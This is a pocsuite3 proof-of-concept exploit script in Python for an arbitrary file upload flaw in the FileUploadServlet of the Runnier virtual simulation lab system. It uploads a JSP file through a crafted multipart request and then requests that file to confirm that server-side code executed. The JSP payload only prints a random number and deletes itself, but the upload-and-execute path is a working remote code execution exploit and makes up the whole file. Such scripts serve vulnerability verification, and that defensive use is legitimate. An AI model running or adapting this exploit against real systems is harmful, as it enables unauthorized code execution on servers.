from collections import OrderedDict
from urllib.parse import urljoin
import re,json,time,base64,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2024-04-12'  #漏洞公开的时间,不知道就写今天
    createDate = '2024-04-12'  # 编写 PoC 的日期
    updateDate = '2024-04-12'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '润尼尔虚拟仿真实验室系统FileUploadServlet存在任意文件上传'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '润尼尔虚拟仿真实验室系统'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.UPLOAD_FILES  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
       润尼尔虚拟仿真实验室系统FileUploadServlet存在任意文件上传
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = "/chatroom/FileUploadServlet"
        url = self.url + path
        # 随机生成字符串
        str_num = str(random.randint(1000000000,9999999999))
        # 进行base64编码
        base64_num = base64.b64encode(str_num.encode('utf-8')).decode('ascii')
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=WebKitFormBoundaryo5HTN9AzR7zKf8Zm',
        }
        data =f'''--WebKitFormBoundaryo5HTN9AzR7zKf8Zm\r
Content-Disposition: form-data; name="aaa"; filename="test123456.jsp"\r
\r
<% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("{base64_num}"))); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r
--WebKitFormBoundaryo5HTN9AzR7zKf8Zm--\r
'''
        try:
            resq = requests.post(url=url,data=data,headers=headers,timeout=5)
            if resq.status_code == 200:
                resq = requests.get(url=self.url+'/chatroom/uploadFile/test123456.jsp',headers=headers)
                if str_num in resq.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url+'/chatroom/uploadFile/test123456.jsp'
        except Exception as e:
            print(e)
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
